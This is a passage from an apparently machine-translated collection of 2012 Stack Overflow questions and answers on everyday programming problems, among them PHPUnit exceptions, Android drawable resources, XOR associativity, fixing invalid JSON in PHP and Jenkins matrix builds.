-- BOOST_INCLUDE_DIRS=/home/ec2-user/build/2_0/build_server/lib/linux/gcc/64/include
-- ENV{MYSQL_DIR} = 
-- MySQL Include dir: /home/ec2-user/build/2_0/build_server/lib/linux/gcc/64/include
-- MySQL Library    : /usr/lib64/mysql/libmysqlclient_r.so
-- MySQL Library dir: /usr/lib64/mysql
-- MySQL CXXFLAGS: 
-- MySQL Link flags: 
-- Looking for mysql_set_character_set
-- Looking for mysql_set_character_set - not found
CMake Error at FindMySQL.cm:182 (MESSAGE):
  Versions < 4.1.13 (for MySQL 4.1.x) and < 5.0.7 for (MySQL 5.0.x) are not
  supported.  Please update your libraries.
Call Stack (most recent call first):
  CMakeLists.txt:173 (INCLUDE) 
```

我认为错误是找不到 mysql_set_character_set 并且它显示错误的错误消息。

# checkstyle - Checkstyle - 只检查接口中的方法

> ID：13271326
> 
> 赞同：6
> 
> 时间：2012-11-07T14:01:36.613
> 
> 标签：checkstyle

是否可以仅在接口中的方法上应用 JavadocMethod 检查器？（不在实现类中）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T06:42:28.167

我们也计划实施它，密切关注[问题](https://github.com/sevntu-checkstyle/sevntu.checkstyle/issues/70)，不确定何时修复它，或者欢迎提供补丁，我们已经拥有完整的开发基础设施。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T20:55:06.160

如果您使用的是 Java 6，您可以使用 注释实现方法`@Override`，这将告诉 JavadocMethod 检查器不需要 Javadoc 注释。引用 JavadocMethod 文档：

> `@Override`使用注解标记的方法不需要 Javadoc 。

文档继续说明您需要 Java 6。在 Java 5 中，您仍然可以使用`{@inheritdoc}`，这总比没有好：

> 但是，在 Java 5 下，无法标记接口所需的方法（这在 Java 6 下已*得到纠正）。*因此 Checkstyle 支持使用单个`{@inheritDoc}`标签而不是所有其他标签的约定。

内置的 Eclipse 代码格式化程序可以自动`@Override`为您添加注释，所以这应该是您所需要的。

# php - PHPUnit 在 setExpectedException() 后停止执行

> ID：13271329
> 
> 赞同：1
> 
> 时间：2012-11-07T14:01:52.807
> 
> 标签：php, phpunit

我有以下伪代码

```
public function testSomething() {
    // assert something
    // assert something else

    $this->setExpectedException(...);
    // trigger my exception here

    // do one last thing
} 
```

我看到的问题是，触发异常后的代码永远不会生成。它是否正确？

这只是一个普遍的疑惑——如果这是正常的，我将重构我的测试以直接执行 try/catch，`fail()`如果没有捕获到则测试。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:15:35.087

异常后的代码不应该做。把测试想象`setExpectedException`成一个，`try -- catch`所以抛出异常后的代码不会被执行。

如果你需要在异常发生后做/检查事情，你应该抓住它。尽管您的捕获有一个警告，但要具体说明引发了什么异常。PHPUnit 会为失败的测试抛出异常，您可能会意外捕获此异常，这可能会导致您的测试错误地通过。

更新：如果您正在执行的代码正在清理，请考虑将其移动到测试的 tearDown 方法中。

# android - 在 Android 应用程序中播放 YouTube 视频的最适应方式

> ID：13271333
> 
> 赞同：0
> 
> 时间：2012-11-07T14:02:15.250
> 
> 标签：android, html, youtube

我在谷歌上搜索了这个问题，发现了 4 种可能的方法：

1.  使用以下方式播放视频：
    startActivity(newIntent(Intent.ACTION_VIEW,Uri.parse(uri)));
2.  获取 RTSP 链接并使用 VideoView 播放视频
3.  使用 Flash 播放视频
4.  使用 HTML5 iframe

我有一个 android 4.0 设备，我可以使用前三种方法播放 YouTube 视频。我的问题是：哪种方法最适合不同的版本。如果答案是使用 HTML5，我该怎么做。非常感谢您的宝贵时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T19:53:08.737

最全面的方法是使用 URI 解析打开它。还有一种方法可以强制调用 YouTube 应用程序（对不起，我想我在某个地方读过它，但我不记得如何）并在那里显示视频。这意味着您无法选择在浏览器中打开视频。

其余替代方案仅受某些设备支持。（Flash 已过时，大多数设备不支持 HTML5）。如果您打算做其他事情，然后使用内置的 YouTube 应用程序，我会推荐 RTSP 作为最佳选择。

# algorithm - 如何提高输出正确答案的概率？

> ID：13271334
> 
> 赞同：1
> 
> 时间：2012-11-07T14:02:16.113
> 
> 标签：algorithm, random, probability

一个采样算法可以输出 [0,1] 范围内的任何实数，但正确答案在 [0.1,0.2+x] 范围内（“x”在 [0,1] 范围内），该算法可以输出一个正确答案的概率大于“0.8”，那么如何给出一个高概率的好答案呢？（比如多次运行，选择中位数作为正确答案）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:25:02.267

我认为这个问题可能是关于中心极限定理。如果样本是独立且同分布的，则 OP 可以应用经典形式：[Classical CLT](https://en.wikipedia.org/wiki/Central_limit_theorem#Classical_CLT)

否则，我建议查看维基百科文章的其余部分，看看是否有任何其他形式适用。

# php - Querypath 从表中提取元素

> ID：13271336
> 
> 赞同：0
> 
> 时间：2012-11-07T14:02:18.167
> 
> 标签：php, querypath

我正在使用 Querypath 从表中提取名称和位置信息。我已经能够使用 innerhtml() 提取表格本身，但现在我正在尝试将文本收集到变量中。这是我的代码：

```
$searchpage = my_curl($mypage);
$searchqp = htmlqp($searchpage,'body');
$storeinfo = $searchqp->branch()->find('table[class="kwrestuls_table"]');
$storename = $storeinfo->innerhtml();
return $storename; 
```

这为我提供了我需要的核心信息。现在我需要获取商店名称。我试过使用：

```
$storeinfo = $searchqp->branch()->find('table[class="kwrestuls_table"]');
$storestuff = $storeinfo->innerhtml();
$storename = $storestuff->top('a[href]')->attr('href')->text();
return $storename; 
```

但这并没有返回任何东西。不幸的是，我在共享主机上，看不到错误，但我怀疑 QueryPath 正在抛出错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:04:43.677

我通过使用以下代码完成了我的壮举：

```
$searchqp = htmlqp($searchpage,'body');
$storeinfo = $searchqp->branch()->find('table[class="kwrestuls_table"]');
$storestuff = $storeinfo->innerhtml();
$storename = htmlqp($storestuff, 'a')->eq(0)->text();
$storeaddress = htmlqp($storestuff, 'div')->eq(0)->text();
$storephones = htmlqp($storestuff, 'div')->eq(1)->text();
return $storephones; 
```

# java - Java 编译警告不安全条件

> ID：13271338
> 
> 赞同：0
> 
> 时间：2012-11-07T14:02:25.540
> 
> 标签：java, compiler-warnings, javac

我最近开始用java编程我做了这个代码： [https ://github.com/mouuff/JavaMD5cracker](https://github.com/mouuff/JavaMD5cracker)

代码有效，但我收到了这个令人毛骨悚然的警告：

```
C:\Users\mou\Desktop\JavaMD5cracker-master>javac icrackmd5.java
Note: .\brute.java uses unchecked or unsafe operations.
Note: Recompile with -Xlint:unchecked for details. 
```

听起来编译器发现这一行 (brute.java : l 26) 不安全或者我不知道......

```
if (tries > (int)pows.get(lenght-1)) 
```

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:10:11.767

这是因为您在**brute.java中的哈希表声明**

```
Hashtable pows = new Hashtable(); 
```

当编译器执行此行时

```
if (tries > (int)pows.get(lenght-1)) 
```

它不知道**pows**中元素的类型是什么。

使用泛型更改您的哈希表声明

```
Hashtable<Integer, Integer> pows = new Hashtable<Integer,Integer>(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:05:32.763

只是您正在`int`另一个对象中进行强制转换操作。这是一个未经检查的操作，因为编译器无法检查您返回的内容是否`pows.get(length-1)`真的可以转换为`int`.

如果您信任（我的意思是真正信任）您的代码并且知道`int`可以始终进行强制转换，那么您可以这样做，这只是编译器警告。

同时，看一下[Math](http://docs.oracle.com/javase/7/docs/api/java/lang/Math.html)对象。也许有一种更简单、更安全的方法来完成你想要完成的事情。

**编辑**

改变这个：

```
Hashtable pows = new Hashtable(); 
```

到：

```
Hashtable<Integer,Integer> pows = new Hashtable<Integer,Integer>(); 
```

将摆脱您的编译器注释。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:12:43.077

该类[`brute`](https://github.com/mouuff/JavaMD5cracker/blob/master/brute.java)包含以下内容：

```
Hashtable pows = new Hashtable(); 
```

它使用原始类型`Hashtable`。这里应该使用泛型。此外，它应该使用`HashMap`而不是旧的集合类`Hashtable`。

```
Map<Integer, Integer> = new HashMap<Integer, Integer>(); 
```

那么演员表将是不必要的：

```
if (tries > pows.get(lenght-1)){ 
```

（请注意，“长度”拼写错误，应该是“长度”）。

除此之外，成员变量应该是`private`，并且代码不符合世界上大多数人使用的事实上的编码标准（类名应该以大写字符开头，变量名不应包含下划线）。

# c - XOR 的关联属性的逻辑证明

> ID：13271339
> 
> 赞同：12
> 
> 时间：2012-11-07T14:02:26.830
> 
> 标签：c, boolean-logic, discrete-mathematics, proof

我遇到了一个常见的编程面试问题：给定一个无符号整数列表，找到一个在列表中出现奇数次的整数。例如，如果给定列表：

```
{2,3,5,2,5,5,3} 
```

解决方案将是整数 5，因为它在列表中出现 3 次，而其他整数出现偶数次。

我最初的解决方案涉及设置一个排序数组，然后遍历数组：对于每个奇数元素，我将添加整数，而对于每个偶数元素，我将减去；最后的总和是解决方案，因为其他整数会抵消。

但是，我发现通过简单地对每个元素执行 XOR 来实现更有效的解决方案——您甚至不需要排序数组！也就是说：

```
2^3^5^2^5^5^3 = 5 
```

我从离散结构类中回忆起，关联属性适用于 XOR 操作，这就是该解决方案有效的原因：

```
a^a = 0 
```

和：

```
a^a^a = a 
```

虽然我记得 Associative Property 适用于 XOR，但我很难找到 XOR 特定属性的逻辑证明（互联网上的大多数逻辑证明似乎更侧重于 AND 和 OR 操作）。有谁知道为什么关联属性适用于 XOR 操作？

我怀疑它涉及包含 AND 和/或 OR 的 XOR 身份。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-07T14:11:04.033

关联属性表示`(a^b)^c = a^(b^c)`。由于 XOR 是按位的（数字中的位被并行处理），我们只需要考虑单个位的 XOR。然后可以通过检查所有可能性来完成证明：

```
abc (a^b) (a^b)^c (b^c) a^(b^c)
000   0      0      0      0
001   0      1      1      1
010   1      1      1      1
011   1      0      0      0
100   1      1      0      1
101   1      0      1      0
110   0      0      1      0
111   0      1      0      1 
```

由于第三列 ，`(a^b)^c`与第五列 ， 相同`a^(b^c)`，因此关联属性成立。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:36:50.097

只要`a ^ b == ~a & b | a & ~b`，你可以证明：

```
(a ^ b) ^ c = ~((~a & b) | (a & ~b)) & c | ((~a & b) | (a & ~b)) & ~c 
```

和

```
a ^ (b ^ c) = a & ~((~b & c) | (b & ~c)) | ~a & ((~b & c) | (b & ~c)) 
```

是平等的。

# android - 如何在Android中为不同的分辨率使用不同的背景图片？

> ID：13271340
> 
> 赞同：12
> 
> 时间：2012-11-07T14:02:27.657
> 
> 标签：android, android-layout, android-resources, android-resolution

我正在为具有**完整图像背景的 Android****平板电脑**做一个 Android 应用程序，但**我不能使用 9-patch**，所以我需要背景尽可能接近窗口大小。

 ****## 我测试过的内容：

我已经使用`drawable-ldpi`, `drawable-mdpi`, etc... 文件夹进行了测试，但是由于我希望图像适合窗口，因此效果不佳。

现在我正在尝试使用`drawable-wxxxdp`, 文件夹来获得尺寸*接近*真实窗口大小的图像。

所以我有这个文件夹结构（每个文件夹都有不同的图像，即：不同文件夹上相同大小的图像不同）：

```
drawable-w800dp-mdpi // 800x600px image
drawable-w800dp-hdpi // 800x600px image
drawable-w1024dp-mdpi // 1024x600px image
drawable-w1024dp-hdpi // 1024x600px image
drawable-w1280dp-mdpi // 1280x800 image
drawable-w1280dp-hdpi // 1280x800 image
drawable-w1280dp-xhdpi // 1280x800 image 
```

**问题**是，当我在不同的平板电脑上测试应用程序时，它**并不总是从预期的文件夹中获取图像**。

例如：在**1280x800px 和 160 dpis 的平板电脑**中，它报告（使用`DisplayMetrics`）**窗口大小为 1280x752**，它使用文件夹中的 1280x800px 图像`drawable-w1280dp-mdpi`并从顶部和底部剪切一点图像。但是在 报告**窗口大小为 1280x736的****1280x800px 和 213dpis 平板电脑**上，它从...获取图像...我希望从其他文件夹中获取它，例如 drawable-w1024dp 文件夹之一...但不是从那个.. .**`drawable-w800dp-hdpi`**

 **另一方面，如果我尝试使用**1024x600px 和 160dpis**等配置的模拟器，报告**窗口大小为 1024x552**，它会从文件夹中获取图像，`drawable-w1024dp-hdpi`但会将**其缩小并在屏幕上居中，**所以我以非常*大的边框结束所有围绕图像*。

## 文件：

我正在使用的测试布局是：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <ImageView
        android:id="@+id/appBackground"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:scaleType="center"
        android:src="@drawable/background_image"
        tools:ignore="ContentDescription" />

</RelativeLayout> 
```

在我的清单文件中，我有：

```
<uses-sdk
    android:minSdkVersion="13"
    android:targetSdkVersion="15" />

<supports-screens 
android:anyDensity="true" 
android:largeScreens="true"
android:normalScreens="true" 
android:smallScreens="true"
android:resizeable="true"/> 
```

**更新：** 我的活动代码：

```
public class ScreenTest extends Activity {

   private int width;
   private int height;
   private int dpis;
   private String sdpis;

   @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Ask for a full screen window
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
              WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_screen_test);
  }

    /* (non-Javadoc)
    * @see android.app.Activity#onCreateView(java.lang.String, android.content.Context, android.util.AttributeSet)
    */
   @Override
   public View onCreateView(String name, Context context, AttributeSet attrs) {
      return super.onCreateView(name, context, attrs);
   }

   /* (non-Javadoc)
    * @see android.app.Activity#onStart()
    */
   @Override
   protected void onStart() {
      // TODO Auto-generated method stub
      super.onStart();
      // Get the info about the screen
      Display display = getWindowManager().getDefaultDisplay();
      width = display.getWidth();// size.x;
      height = display.getHeight();
      DisplayMetrics outMetrics = new DisplayMetrics();
      display.getMetrics(outMetrics);
      dpis = outMetrics.densityDpi;
      sdpis = "";

      switch (dpis) {
         case DisplayMetrics.DENSITY_DEFAULT:
               sdpis = "160";
               break;
         case DisplayMetrics.DENSITY_HIGH:
            sdpis = "240";
            break;
         case DisplayMetrics.DENSITY_LOW:
            sdpis = "120";
            break;
         case DisplayMetrics.DENSITY_XHIGH:
            sdpis = "320";
            break;
         default:
            sdpis +=dpis;
            break;
      }
      Log.d("DPIs", "dpis: " + dpis + " sdpis: " + sdpis + " width: " + width + " height: " + height);

   }

   @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_screen_test, menu);
        return true;
    }
} 
```

## 概括：

所以我不知道**如何预测 App 将从哪个文件夹中获取图像？**它会做**什么？**（规模，作物...）

## 额外背景：

我已经检查了[android-resoruces](https://stackoverflow.com/questions/tagged/android-resources)标签上的所有问题，我已经阅读了几次官方文档：

*   [支持多个屏幕](http://developer.android.com/guide/practices/screens_support.html)
*   [提供资源：最佳匹配](http://developer.android.com/guide/topics/resources/providing-resources.html#BestMatch)

和一些相关的问题：

*   [如何找到最佳匹配](https://stackoverflow.com/questions/9630639/android-how-to-findout-the-best-match)
*   [Android 资源“最佳匹配”回退逻辑](https://stackoverflow.com/questions/10685466/android-resources-best-match-fallback-logic)
*   [android中可绘制的动态位图](https://stackoverflow.com/questions/9621540/dynamic-bitmap-drawable-in-android)
*   [为什么 Android 使用来自较高资源而不是较低资源的资源？](https://stackoverflow.com/questions/11231533/why-android-uses-resources-from-the-higher-resource-instead-of-a-lower)

**更新：**修复了文件夹名称中的拼写错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:18:45.430

你是对的，它会从中选择资源`w800dp`，因为你在纵向模式下运行。

当屏幕的方向在横向和纵向之间切换时，系统对应的宽度值会发生变化，以反映 UI 可用的当前实际宽度。

采用`res/drawable-sw600dp`

当屏幕的方向改变时，设备的 minimumWidth 不会改变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-20T13:19:45.040

如果要针对特定​​设备。或介于两种分辨率之间的所有设备，那么您必须首先找到设备的宽度。像这样

```
Display display ; 
int width =0;
display = getWindowManager().getDefaultDisplay(); 
width = display.getWidth(); 
```

之后，您可以制作带有宽度条件的 if 语句，并为不同的屏幕尺寸制作不同的布局。这不是推荐的方法，但在某些情况下效果很好

```
 if(width>=750)
      {
          setContentView(R.layout.screen_blue_heigh);
      }
   else if(width>=500&&width<750)
      {
          setContentView(R.layout.screen_blue_heigh);
      }
   else if(width<500&&width>=330)
      {
              setContentView(R.layout.screen_blue_medium);
      }
   else if(width<320)
       {
          setContentView(R.layout.screen_blue_low);
       } 
```

希望这会帮助你。******

# c# - Xsd 文档价值

> ID：13271347
> 
> 赞同：0
> 
> 时间：2012-11-07T14:03:10.453
> 
> 标签：c#, xsd, annotations, element

如何以编程方式创建 xsd 文档？例子：

```
<xs:annotation>
<xs:documentation>Documentation</xs:documentation>
</xs:annotation> 
```

我用了：

```
 XmlSchemaElement element = new XmlSchemaElement();
    XmlSchemaAnnotation annotation = new XmlSchemaAnnotation();
    XmlSchemaDocumentation doc = new XmlSchemaDocumentation();

    //doc.Value = "Documentation"; ??
    annotation.Items.Add(doc);
    element.Annotation = annotation; 
```

但是如何设置文档价值？XmlSchemaDocumentation 类型中没有这样的属性。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:22:40.070

我认为你错过了一件小事，比如

```
annotation.Items.Add(doc);
doc.Markup = TextToNodeArray("Your text you need"); 
```

你能试试这个，看看是否有帮助？

否则请参阅[http://msdn.microsoft.com/en-us/library/system.xml.schema.xmlschemadocumentation.aspx](http://msdn.microsoft.com/en-us/library/system.xml.schema.xmlschemadocumentation.aspx)这应该会给你很好的例子，否则如何使用它。

# php - javascript子字符串提取

> ID：13271351
> 
> 赞同：1
> 
> 时间：2012-11-07T14:03:24.620
> 
> 标签：php, javascript, string

我有一个 javascript 脚本，其中有行，一个例子是：

```
http://www.youtube.com/watch?v=FOeLP1WdjFc&feature=related 
```

我想提取“watch？=”之后和“&feature”之前的子字符串，它的模式是：

1）它在“手表？=”之后

2) 它在“&feature”之前，

3) 它是一个 11 个字符的字符串

我知道其他脚本可能很简单，但现在我只需要javascript，如果真的不可能，那么php是可以接受的，如何实现呢？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:06:42.773

试试这个（[工作示例](http://jsfiddle.net/KZq8v/)）：

```
var s = "http://www.youtube.com/watch?v=FOeLP1WdjFc&feature=related";

var left = "watch?v=";
var right = "&feature";

var parsed = s.substring(s.indexOf(left) + left.length, s.indexOf(right));

console.log(parsed);​ 
```

这是一个非常粗略、快速的答案，因此我建议您研究正则表达式以获得更具可扩展性的方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:07:15.320

您可以使用正则表达式来制定您的要求：

```
var res = url.match(/watch?=(.{11})&feature/);
if (res != null)
    return res[1]; 
```

并不是说这会起作用（提取`v`参数的内容），但它会按照您的描述进行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:07:28.140

[`.indexOf()`](http://www.w3schools.com/jsref/jsref_indexof.asp)你可以使用 JavaScript和[`.substring()`](http://www.w3schools.com/jsref/jsref_substring.asp)方法来实现你所需要的。

```
var index = url.indexOf('?v=') + 3;
alert(url.substring(index, index + 11)); 
```

请参阅此[演示](http://jsfiddle.net/wRYEc/)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-07T14:08:26.010

在 PHP 中，您可以使用标准函数[`parse_url()`](http://www.php.net/manual/en/function.parse-url.php)来解析 URL 并[`parse_str()`](http://www.php.net/manual/en/function.parse-str.php)解析查询字符串以提取单个 GET 参数，例如`v`.

# jasper-reports - 如何根据用户角色限制查看部分子报表

> ID：13271353
> 
> 赞同：0
> 
> 时间：2012-11-07T14:03:38.940
> 
> 标签：jasper-reports, jasperserver

> **可能重复：**
> [对特定用户隐藏报告](https://stackoverflow.com/questions/12705747/hiding-reports-from-specific-user)

我有一个主报告，里面有几个*子*报告。

如何根据角色限制用户查看*JasperReports/JasperReports Server*中的某些*子报表*？

# php - 如何更正 php 中的无效 JSON？

> ID：13271354
> 
> 赞同：1
> 
> 时间：2012-11-07T14:03:40.130
> 
> 标签：php, json

我有个问题。对于一个错误，我有很多无效的 JSON 字符串，如下所示：

```
{
    "d": {
        "results": [
            {
                "__metadata": {
                    "uri": "https://api.datamarket.azure.com/Data.ashx/Bing/Search/Web?Query=u0027non supporting iframesu0027&Market=u0027it-ITu0027&Adult=u0027Offu0027&Options=u0027DisableLocationDetectionu0027&WebSearchOptions=u0027DisableQueryAlterationsu0027&$skip=0&$top=1",
                    "type": "WebResult"
                },
                "ID": "7858fc9f-6bd5-4102-a835-0fa89e9f992a",
                "Title": "something good",
                "Description": "something "WRONG" here!",
                "DisplayUrl": "www.devx.com/Java/Article/27685/1954",
                "Url": "http://www.devx.com/Java/Article/27685/1954"
            }
        ],
        "__next": "https://api.datamarket.azure.com/Data.ashx/Bing/Search/Web?Query=u0027non%20supporting%20iframesu0027&Market=u0027it-ITu0027&Adult=u0027Offu0027&Options=u0027DisableLocationDetectionu0027&WebSearchOptions=u0027DisableQueryAlterationsu0027&$skip=50"
    }
} 
```

如您所见，描述字段包含一个错误的字符串（“转换为”），因此我无法使用 php 的 json_decode 解析 json，实际上它返回 NULL。我有 100 万个错误的 json，比这大得多（10 倍）。我怎么能在php中做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:25:39.460

在您的情况下，您可以利用 json 中的字符串不能超过一行的事实。使用多行感知搜索并用[`preg_match_callback`](http://php.net/preg_match_callback)PHP 中的正则表达式函数替换这是一个快速的点。

```
 /^\s+"[a-z_"]+": "([^"]*".*)",?$/mi 
```

行首的空格；member-name 形式的有效名称（此处只有字符和下划线）作为字符串；the `:`，然后是断开的字符串*，直到行尾*可选地后跟一个逗号`,?`。

此正则表达式已仅匹配无效行。但是，如果您的 json 还包含一个有效的字符串`\"`，则此正则表达式*实际上不起作用*。

因此，最好进行一些检查以确保替代品会按照预期进行。

```
$like = '... json-like but broken json string as in question ...';

// Fixing #1: member strings containing double-quotes on the same line.

$fix1Pattern   = '/^(\s+"[a-z_]+": ")([^"]*".*)(",?)$/mi';

$fix1Callback  = function ($matches) {
    list($full, $prefix, $string, $postfix) = $matches;
    $fixed = strtr($string, ['"' => '\"']);
    if (!is_string(json_decode("\"$fixed\""))) {
        throw new Exception('Fix #1 did not work as intended');
    }
    return "$prefix$fixed$postfix";
};

// apply fix1 onto the string

$buffer = preg_replace_callback($fix1Pattern, $fix1Callback, $like);

// test if it finally works

print_r(json_decode($buffer)); 
```

请记住，这是有限的。您可能需要先了解正则表达式，这是它自己的世界。但原理通常非常相似：您在字符串中搜索损坏部分的模式，然后进行一些字符串操作来修复这些部分。

如果 json 字符串更坏，那么这需要更多的爱，可能仅用正则表达式不容易解决。

代码示例的示例输出和提供的数据：

```
stdClass Object
(
    [d] => stdClass Object
        (
            [results] => Array
                (
                    [0] => stdClass Object
                        (
                            [__metadata] => stdClass Object
                                (
                                    [uri] => https://api.datamarket.azure.com/Data.ashx/Bing/Search/Web?Query=u0027non supporting iframesu0027&Market=u0027it-ITu0027&Adult=u0027Offu0027&Options=u0027DisableLocationDetectionu0027&WebSearchOptions=u0027DisableQueryAlterationsu0027&$skip=0&$top=1
                                    [type] => WebResult
                                )

                            [ID] => 7858fc9f-6bd5-4102-a835-0fa89e9f992a
                            [Title] => something good
                            [Description] => something "WRONG" here!
                            [DisplayUrl] => www.devx.com/Java/Article/27685/1954
                            [Url] => http://www.devx.com/Java/Article/27685/1954
                        )

                )

            [__next] => https://api.datamarket.azure.com/Data.ashx/Bing/Search/Web?Query=u0027non%20supporting%20iframesu0027&Market=u0027it-ITu0027&Adult=u0027Offu0027&Options=u0027DisableLocationDetectionu0027&WebSearchOptions=u0027DisableQueryAlterationsu0027&$skip=50
        )

) 
```

# ios - iOS route-me 可拖动标记丢失轨道（即使在样本中）

> ID：13271356
> 
> 赞同：0
> 
> 时间：2012-11-07T14:03:44.907
> 
> 标签：ios, objective-c, draggable, marker, route-me

在我的 iOS 应用程序中，我使用 route me lib 在离线模式下显示地图。我在地图上有一些标记，现在我想让它们可拖动。我使用了这段代码：

```
- (void) mapView:(RMMapView *)map didDragMarker:(HotspotMarker*)marker withEvent:(UIEvent *)event
{
    UITouch* touch = [[event allTouches] anyObject];
    if([[event allTouches] count] == 1 && touch.phase == UITouchPhaseMoved)
    {
        CGPoint position = [touch locationInView:[touch.view superview]];
        CGSize delta = CGSizeMake((position.x-(marker.position.x)),
                                  (position.y-(marker.position.y)));
        [marker moveBy: delta];
        [marker setProjectedLocation:[[_mapView.contents projection]
                                      latLongToPoint:[_mapView pixelToLatLong:marker.position]]];
    }
} 
```

当我缓慢移动鼠标时，标记会很好地拖动，但是当我稍微快速移动鼠标时，我会松开轨道。

所以我查看了示例“MapTestbedFlipMaps”项目并运行它......并遇到了同样的问题。

然后我尝试用手势识别器自己做......但我仍然有这个问题。

任何想法 ？

编辑：问题不在于标记的图像大小，我尝试使用 100x100 图像并得到相同的结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-06T21:56:44.500

尝试这个：

```
- (void) mapView:(RMMapView *)map didDragMarker:(RMMarker *)marker withEvent:(UIEvent *)event
{

    CGPoint position = [[[event allTouches] anyObject] locationInView:mapView];

    CGRect rect = [marker bounds];

    [self.mapView.markerManager moveMarker:marker AtXY:CGPointMake(position.x,position.y +rect.size.height/3)];

} 
```

# android - 如何在 Jenkins 上使用 google api 创建多配置矩阵项目？

> ID：13271361
> 
> 赞同：1
> 
> 时间：2012-11-07T14:04:22.853
> 
> 标签：android, jenkins, google-api, emulation

我正在尝试配置矩阵项目以在不同的模拟器配置上运行我的 apk，但是当我尝试使用**“Google Inc.:Google APIs:16”**作为我的操作系统目标时，该项目未构建。当我尝试在 Android 4.1 上构建时，它可以工作，但我需要使用 google api 在其上运行猴子。我应该使用 os 参数向矩阵输入什么以使用 google API 创建模拟器？

> 触发 ldpi,Google Inc.:Google APIs:16,WVGA ldpi,Google Inc.:Google APIs:16,WVGA completed with result FAILURE

*   > java.io.IOException: 无法 mkdirs: ...\MatrixProject\density\ldpi\os\Google Inc.:Google APIs:16\resolution\WVGA at hudson.FilePath.mkdirs(FilePath.java:973) at hudson。 model.AbstractProject.checkout(AbstractProject.java:1323) at hudson.model.AbstractBuild$AbstractBuildExecution.defaultCheckout(AbstractBuild.java:676) at jenkins.scm.SCMCheckoutStrategy.checkout(SCMCheckoutStrategy.java:88) at hudson.model.AbstractBuild $AbstractBuildExecution.run(AbstractBuild.java:581) at hudson.model.Run.execute(Run.java:1516) at hudson.matrix.MatrixRun.run(MatrixRun.java:146) at hudson.model.ResourceController.execute( ResourceController.java:88) at hudson.model.Executor.run(Executor.java:236) [FINDBUGS] 由于构建结果失败，因此跳过发布者

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:38:02.430

看起来您使用的是 Windows，它不支持包含冒号的文件名，因此 Jenkins 在尝试为每个构建组合创建唯一目录时失败。

目前，您的操作系统版本轴包含类似“ `Google Inc.:Google APIs:16`”的值，而“Android OS”字段可能包含类似“ `${os}`”的内容。

相反，请尝试将轴更改为仅包含 API 级别，例如“ `16`”，并将“Android OS”字段更改为“ `Google Inc.:Google APIs:${os}`”。

这样，Jenkins 创建的目录名称就不会包含冒号。

# ruby - MongoId - 未初始化的常量 App::Mongo (NameError)"

> ID：13271365
> 
> 赞同：1
> 
> 时间：2012-11-07T14:04:48.727
> 
> 标签：ruby, mongodb, gem, sinatra

在 Sinatra 应用程序中，我有

```
 #config.rb
  require 'mongoid'

  class App
    configure do 
        Mongoid.configure do |config|
          name = "my_db"
          host = "localhost"
          config.master = Mongo::Connection.new.db(name)
          config.slaves = [Mongo::Connection.new(host, 27017, :slave_ok => true).db(name)]
          config.persist_in_safe_mode = false
        end
      end
    end

    #Gemfile
    gem "mongoid", "~> 3.0.0"
    gem "bson_ext" 
```

它给了我一个错误“`const_missing': uninitialized constant App::Mongo (NameError)” 我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:55:19.613

这是因为 Mongoid 3.x 不再使用 10Gen Ruby 驱动程序，`Mongo`因此`require 'mongoid'`. 您需要使用新`Mongoid.load!`方法。随着语法的改变，您可能需要稍微更改 config.yml 文件。请参阅[http://mongoid.org/en/mongoid/docs/installation.html](http://mongoid.org/en/mongoid/docs/installation.html)

# plone - 使英文 portlet 出现在其他 LinguaPlone 翻译文件夹中

> ID：13271366
> 
> 赞同：1
> 
> 时间：2012-11-07T14:04:50.317
> 
> 标签：plone, linguaplone

我有一个有五种不同语言的网站。我有一个英文portlet，我想让它以其他语言出现在文件夹和寻呼机中，这样所有语言的更新都会自动进行（无需手动复制粘贴文本）。

对于此类问题，Plone 生态系统有哪些解决方案？

*   从其他文件夹链接 portlet

*   制作“语言中立”portlet

在这种情况下，不能在站点语言中性根目录中创建 portlet，因为 portlet 特定于站点的一个子部分。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T16:57:21.280

我将自定义portlet 以仅在上下文中存在特定标记界面时才呈现，然后将其分配给与语言无关的根。如果您需要在一个部分中的所有文件夹上显示 portlet，您可以*在下面*检查`aq_chain(context)`列表中所有对象的接口。

然后，将该标记界面分配给您希望 portlet 出现的部分。

# javascript - Three.js - 更新的几何图形不会呈现更改

> ID：13271367
> 
> 赞同：2
> 
> 时间：2012-11-07T14:04:50.560
> 
> 标签：javascript, 3d, three.js

